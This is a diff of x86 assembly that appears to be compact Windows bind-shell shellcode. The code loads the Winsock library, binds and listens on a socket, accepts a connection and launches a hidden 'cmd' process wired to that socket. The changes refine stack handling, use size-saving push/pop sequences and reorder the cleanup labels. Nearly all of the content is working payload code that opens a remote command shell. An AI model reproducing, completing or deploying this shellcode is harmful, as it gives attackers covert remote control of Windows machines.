@@ -289,23 +289,27 @@ gapi_l6x:
     bits   32    
 
 rc_l2:    
-    add    esp, -512
-    mov    edi, esp
+int3
+    add    esp, -512    
+    push   esp
+    pop    edi
+    scasd               ; skip 4
 
     ; LoadLibraryA ("ws2_32");
     xor    eax, eax
     cdq
-    push   eax
-    push   eax
-    mov    edx, esp
+    push   eax ; alloc 4 or 8 bytes
+    push   eax ; alloc 4 or 8 bytes
+    push   esp
+    pop    edx
     mov    eax, ~'32'
     not    eax
     mov    dword[edx+4], eax
     mov    dword[edx], 'ws2_'
     push   edx    
     call   ebp
-    pop    eax
-    pop    eax
+    pop    eax ; free 4 or 8 bytes
+    pop    eax ; free 4 or 8 bytes
     
     ; WSAStartup (MAKEWORD(2,0), &wsa);
     push   edi         ; &wsa
@@ -325,6 +329,7 @@ rc_l2:
     test   eax, eax
     js     xit
     
+    push   eax         ; put s on stack
     xchg   eax, ebx    ; ebx = s
 
     ; bind (s, (struct sockaddr*)&sa, sizeof(sa));
@@ -346,14 +351,14 @@ rc_l2:
     push   ebx         ; s
     call   ebp
     test   eax, eax
-    jnz    cls_sck
+    jnz    cls_s
     
     ; listen (s, 0);
     push   eax
     push   ebx
     call   ebp
     test   eax, eax
-    jnz    cls_sck
+    jnz    cls_s
         
     ; accept (s, 0, 0);
     push   eax
@@ -361,17 +366,19 @@ rc_l2:
     push   ebx
     call   ebp
     test   eax, eax
-    js     cls_sck
-        
-    push   ebx
+    js     cls_s
+    
+    push   eax ; put r on stack
     xchg   eax, ebx
     
     ; memset (&si, 0, sizeof(si));
     push   esp
     pop    edi
+    scasd ; skip r
     
     push   edi    
-    mov    al, 68     ; si.cb = sizeof(si); 
+    push   68
+    pop    eax       ; si.cb = sizeof(si); 
     stosd
     mov    al, 64
     xchg   eax, ecx
@@ -402,16 +409,19 @@ rc_l6x:
 rc_l10x:    
     pop    edx
     
+    ;int3
+    
     ; CreateProcess (NULL, "cmd", NULL, NULL, 
     ;     TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     inc    dword[edx+ecx+45]
+    ;mov    dword[edx+44], 100h ;STARTF_USESTDHANDLES
     mov    eax, ~'cmd'
     not    eax
     push   edi
     stosd 
     pop    eax
     push   edi         ; &pi         
-    push   edx         ; &si
+    push   edx         ; &si   
     xor    ecx, ecx    ; ecx = NULL
 
     push   8
@@ -421,25 +431,28 @@ rc_l10x:
     push   ecx         ; NULL
     push   ecx         ; NULL
     push   edx         ; CREATE_NO_WINDOW
-    push   1         ; TRUE
+    push   1           ; TRUE, has to be 1 for NT
     push   ecx         ; NULL
     push   ecx         ; NULL    
     push   eax         ; "cmd", 0
     push   ecx         ; NULL
     call   ebp
     neg    eax
-    jns    cls_sck
+    jns    cls_r
     
     ; WaitForSingleObject (pi.hProcess, INFINITE);
     push   eax         ; INFINITE
     mov    eax, [edi]
     push   eax         ; pi.hProcess
     call   ebp
-cls_sck:
-int3
-    ; closesocket (r);
-    push   ebx         ; r
+cls_r:
+    ; closesocket (s);
+    call   ebp      
+cls_s:
+    ; closesocket (s);
     call   ebp
 xit:    
+int3
     sub    esp, -512
+    ;mov eax, [fs:0x34]
     ret    
